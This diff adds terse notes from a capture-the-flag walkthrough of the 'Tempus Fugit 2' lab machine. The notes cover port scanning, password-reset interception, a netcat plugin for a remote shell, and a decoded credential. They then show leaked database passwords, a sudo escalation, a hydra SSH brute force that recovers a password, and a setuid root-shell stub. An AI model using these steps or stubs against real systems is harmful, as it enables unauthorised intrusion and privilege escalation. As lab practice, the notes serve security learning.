@@ -1,0 +1,182 @@
+root@ap:~/Scrivania/CTF/TempusFugit_2# nmap -A -p- 192.168.43.48
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-19 22:06 CET
+Nmap scan report for 192.168.43.48
+Host is up (0.00066s latency).
+Not shown: 65533 closed ports
+PORT   STATE    SERVICE VERSION
+22/tcp filtered ssh
+80/tcp open     http    Apache httpd 2.4.25 ((Debian))
+|_http-generator: WordPress 5.2.3
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Tempus Fugit 2 &#8211; Back in business
+MAC Address: 08:00:27:03:DA:08 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.66 ms 192.168.43.48
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.95 seconds
+
+
+
+root@ap:/etc# vim hosts
+root@ap:/etc# cat hosts
+127.0.0.1	localhost
+127.0.1.1	ap.ap	ap
+
+192.168.43.48 tf2
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+root@ap:/etc# 
+
+
+
+http://tf2/wp-admin/admin-ajax.php  -----------> 0
+
+<!-- generator="WordPress/5.2.3" -->
+
+
+Users:
+admin
+tommy
+
+
+root@ap:~/Scrivania/CTF/TempusFugit_2# python -m smtpd -n -c DebuggingServer 192.168.43.254:25---------- MESSAGE FOLLOWS ----------
+Date: Mon, 20 Jan 2020 20:48:57 +0000
+To: tfadmin@tempusfugit2.com
+From: Tempus Fugit 2 <tfadmin@f20.be>
+Subject: [Tempus Fugit 2] Password Reset
+Message-ID: <b2ede0da9a1f911554aa0f86b17cac56@tf2>
+X-Mailer: WPMailSMTP/Mailer/smtp 1.6.2
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+X-Peer: 192.168.43.48
+
+Someone has requested a password reset for the following account:
+
+Site Name: Tempus Fugit 2
+
+Username: admin
+
+If this was a mistake, just ignore this email and nothing will happen.
+
+To reset your password, visit the following address:
+
+<http://TF2/wp-login.php?action=rp&key=RaRR7UJ9uCozbKwHFNSc&login=admin>
+
+------------ END MESSAGE ------------
+---------- MESSAGE FOLLOWS ----------
+Date: Mon, 20 Jan 2020 20:49:38 +0000
+To: tfadmin@f20.be
+From: Tempus Fugit 2 <tfadmin@f20.be>
+Subject: [Tempus Fugit 2] Password Changed
+Message-ID: <bcab3a430e94710d8f80c622af93385f@tf2>
+X-Mailer: WPMailSMTP/Mailer/smtp 1.6.2
+MIME-Version: 1.0
+Content-Type: text/plain; charset=UTF-8
+X-Peer: 192.168.43.48
+
+Password changed for user: admin
+
+------------ END MESSAGE ------------
+
+
+
+Reset pass for admin:
+QgSW(112$%3Q)*tm
+
+
+
+Install plugin "mynetcat" in .zip file
+
+Run and give remote shell
+
+
+/var/www/html/wp-content
+
+cd TFDocuments
+ls
+nb.txt
+cat nb.txt
+bGlib3I6OXE0bHcwcjgyY2oxCg==
+
+
+base64 ---> libor:9q4lw0r82cj1
+
+
+After the recent hacking incident, we have locked access to shell. To open up, knock with the year the song was released and Jennys number.
+
+
+1981
+867-5309
+
+
+
+/root/wp
+cat docker-compose.yml
+
+ MYSQL_ROOT_PASSWORD: SecretPssw0rdstuff.this
+      MYSQL_DATABASE: wordpress
+      MYSQL_USER: ElvisP
+      MYSQL_PASSWORD: super.Secret.SQL.Password.For.ElvisP
+
+
+
+libor@TF2:~$ sudo -u romonda /usr/bin/timedatectl list-timezones 
+
+
+FIRST FLAG!!!!!
+romonda@TF2:~$ cat user.txt 
+a81be4e9b20632860d20a64c054c4150
+
+
+
+root@ap:~/Scrivania/CTF/TempusFugit_2# hydra -l romonda -P /usr/share/wordlists/rockyou.txt ssh://192.168.43.48 -t 4
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-22 21:55:48
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
+[DATA] attacking ssh://192.168.43.48:22/
+[STATUS] 40.00 tries/min, 40 tries in 00:01h, 14344359 to do in 5976:49h, 4 active
+[STATUS] 28.00 tries/min, 84 tries in 00:03h, 14344315 to do in 8538:17h, 4 active
+[STATUS] 26.29 tries/min, 184 tries in 00:07h, 14344215 to do in 9095:04h, 4 active
+[STATUS] 26.67 tries/min, 400 tries in 00:15h, 14343999 to do in 8964:60h, 4 active
+[STATUS] 25.94 tries/min, 804 tries in 00:31h, 14343595 to do in 9217:30h, 4 active
+[22][ssh] host: 192.168.43.48   login: romonda   password: bebita
+
+
+root@1786dd63dedb:/var/www/html/wp-content/TFDocuments# touch suid
+root@1786dd63dedb:/var/www/html/wp-content/TFDocuments# echo "int main(void) {" >> suid 
+root@1786dd63dedb:/var/www/html/wp-content/TFDocuments# echo "       setgid(0); setuid(0);" >> suid 
+root@1786dd63dedb:/var/www/html/wp-content/TFDocuments# echo "execl("/bin/sh","sh",0);" >> suid 
+root@1786dd63dedb:/var/www/html/wp-content/TFDocuments# echo "}" >> suid 
+root@1786dd63dedb:/var/www/html/wp-content/TFDocuments# 
+root@1786dd63dedb:/var/www/html/wp-content/TFDocuments# 
+root@1786dd63dedb:/var/www/html/wp-content/TFDocuments# cat suid 
+int main(void) {
+       setgid(0); setuid(0);
+execl(/bin/sh,sh,0);
+}
+root@1786dd63dedb:/var/www/html/wp-content/TFDocuments# chmod 4755 suid 
+root@1786dd63dedb:/var/www/html/wp-content/TFDocuments# ls -la
+total 16
+drwxr-xr-x 2 root     root     4096 Jan 22 22:05 .
+drwxr-xr-x 7 www-data www-data 4096 Jan 22 20:50 ..
+-rw-r--r-- 1 root     root       29 Jan 19 21:58 nb.txt
+-rwsr-xr-x 1 root     root       69 Jan 22 22:06 suid
+
+
+
+
